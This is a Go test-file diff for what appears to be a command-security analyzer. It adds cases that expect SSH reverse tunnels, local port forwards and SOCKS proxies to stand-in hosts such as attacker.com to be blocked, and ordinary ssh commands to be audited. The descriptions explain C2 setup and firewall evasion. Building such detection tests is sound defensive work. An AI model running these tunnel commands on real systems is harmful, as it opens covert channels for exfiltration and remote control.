@@ -676,6 +676,104 @@ var SystemPromptExfilCases = []TestCase{
 	},
 }
 
+// SSHTunnelCases covers SSH port forwarding abuse for C2 and covert exfiltration.
+var SSHTunnelCases = []TestCase{
+	// --- True Positives: remote port forwarding (reverse tunnel) ---
+	{
+		ID:               "TP-NE-BLOCK-SSH-RTUNNEL-001",
+		Command:          "ssh -R 4444:localhost:4444 attacker.com",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "SSH reverse tunnel exposing local port 4444 to attacker.com — classic C2 setup.",
+		Tags:             []string{"tp", "ssh-tunnel", "c2"},
+	},
+	{
+		ID:               "TP-NE-BLOCK-SSH-RTUNNEL-002",
+		Command:          "ssh -fNR 443:localhost:22 c2.attacker.com",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "Background daemon reverse tunnel redirecting SSH through port 443 to evade firewall.",
+		Tags:             []string{"tp", "ssh-tunnel", "c2", "evasion"},
+	},
+	// --- True Positives: local port forwarding (internal pivot) ---
+	{
+		ID:               "TP-NE-BLOCK-SSH-LFWD-001",
+		Command:          "ssh -L 3306:internal-db.local:3306 jump.attacker.com",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "Local port forward tunneling internal database port to attacker-controlled host.",
+		Tags:             []string{"tp", "ssh-tunnel", "pivot"},
+	},
+	{
+		ID:               "TP-NE-BLOCK-SSH-LFWD-002",
+		Command:          "ssh -NL 8080:10.0.0.5:80 bastion.host",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "No-command local forward making internal web service accessible locally.",
+		Tags:             []string{"tp", "ssh-tunnel", "pivot"},
+	},
+	// --- True Positives: SOCKS proxy ---
+	{
+		ID:               "TP-NE-BLOCK-SSH-SOCKS-001",
+		Command:          "ssh -D 1080 attacker.com",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "SSH SOCKS5 dynamic proxy routing all traffic through attacker.com — bypasses all egress controls.",
+		Tags:             []string{"tp", "ssh-tunnel", "socks", "proxy"},
+	},
+	{
+		ID:               "TP-NE-BLOCK-SSH-SOCKS-002",
+		Command:          "ssh -fND 9090 user@external-host.com",
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "Background SOCKS proxy daemon using combined flags -fND on external host.",
+		Tags:             []string{"tp", "ssh-tunnel", "socks", "proxy"},
+	},
+	// --- True Negatives: legitimate SSH usage ---
+	{
+		ID:               "TN-NE-SSH-TUNNEL-001",
+		Command:          "ssh user@server 'ls /var/log'",
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "Normal SSH remote command execution — no port forwarding flags, gets AUDIT from ne-audit-ssh.",
+		Tags:             []string{"tn", "safe", "ssh"},
+	},
+	{
+		ID:               "TN-NE-SSH-TUNNEL-002",
+		Command:          "ssh -p 2222 deploy@prod.server.com 'systemctl status app'",
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "SSH on non-standard port — -p is a port flag, not port forwarding. Gets AUDIT from ne-audit-ssh.",
+		Tags:             []string{"tn", "safe", "ssh"},
+	},
+	{
+		ID:               "TN-NE-SSH-TUNNEL-003",
+		Command:          "ssh -v user@host 'echo test'",
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/network-egress/ssh-tunnel",
+		Analyzer:         "regex",
+		Description:      "SSH with verbose flag for debugging — -v is not a port forwarding flag.",
+		Tags:             []string{"tn", "safe", "ssh"},
+	},
+}
+
 // AllDataExfiltrationCases returns all test cases for Kingdom 3.
 func AllDataExfiltrationCases() []TestCase {
 	var all []TestCase
@@ -686,5 +784,6 @@ func AllDataExfiltrationCases() []TestCase {
 	all = append(all, GitExfilCases...)
 	all = append(all, LLMDataFlowCases...)
 	all = append(all, SystemPromptExfilCases...)
+	all = append(all, SSHTunnelCases...)
 	return all
 }
